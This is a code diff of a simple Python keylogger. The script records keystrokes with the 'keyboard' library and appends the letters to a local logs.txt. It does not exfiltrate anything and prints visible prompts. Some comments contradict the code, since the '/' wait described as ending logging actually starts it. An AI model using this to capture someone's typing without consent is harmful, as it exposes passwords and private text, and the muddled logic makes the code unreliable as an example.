@@ -1,38 +1,48 @@
 import os
-import tkinter as tk
-from tkinter import messagebox
-import sqlite3
 import keyboard  # for keylogs
-from datetime import datetime
-import time
 
-start_time = time.time()
-duration = 15  # in seconds, 60 means 1 minute and so on
+# Use a string to store the captured keyboard input
+key_logs = ""
 
-button = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u',
-          'v', 'w', 'x', 'y', 'z']
+# Create a flag to indicate the end of logging
+end_logging_flag = False
 
-# Write contents to_file
+# Define the key combination to end logging (e.g., pressing '/' key)
+end_logging_key = "/"
+
+# Define the path to the log file
+log_file_path = os.path.join(os.getcwd(), 'logs.txt')
+
 def report(logs):
     """
     Writes the contents of the keyboard logs to a text file named 'logs.txt'.
     """
-    file_path = os.path.join(os.getcwd(), 'logs.txt')
-    with open(file_path, 'a') as f:  # Use 'a' (append) mode to add to the file
+    with open(log_file_path, 'a') as f:  # Use 'a' (append) mode to add to the file
         f.write(logs)
 
-while True:
-    elapsed_time = time.time() - start_time
-    if elapsed_time >= duration:
-        print("Counter reached {} seconds.".format(duration))
-        break
-    # start capturing keyboard input
-    ybutton = keyboard.read_event(suppress=True)
-    # Convert the keyboard event to a string (you can format it as needed)
-    log_entry = f"Key: {ybutton.event_type}, Name: {ybutton.name}, Time: {time.time()}\n"
-    # start reporting the keylogs
-    report(log_entry)
-    print("Elapsed time: {:.2f} seconds".format(elapsed_time))
-    time.sleep(1)  # wait 1 second
+print("Press '/' key to end logging.")
+keyboard.wait(end_logging_key)  # Wait for the '/' key press to end logging
 
-print("Counter finished.")
+# Capture keyboard input
+keyboard.start_recording()
+
+while True:
+    if keyboard.is_pressed(end_logging_key):
+        end_logging_flag = True
+        break
+
+# Get the recorded keyboard events
+events = keyboard.stop_recording()
+
+# Process the events and append to key_logs
+for event in events:
+    if event.event_type == keyboard.KEY_UP:
+        key_logs += event.name
+
+# After logging is finished, write the key logs horizontally
+key_logs = ''.join(filter(str.isalpha, key_logs))
+if key_logs:
+    report(key_logs)
+    print("Logging finished.")
+else:
+    print("No keyboard input logged.")
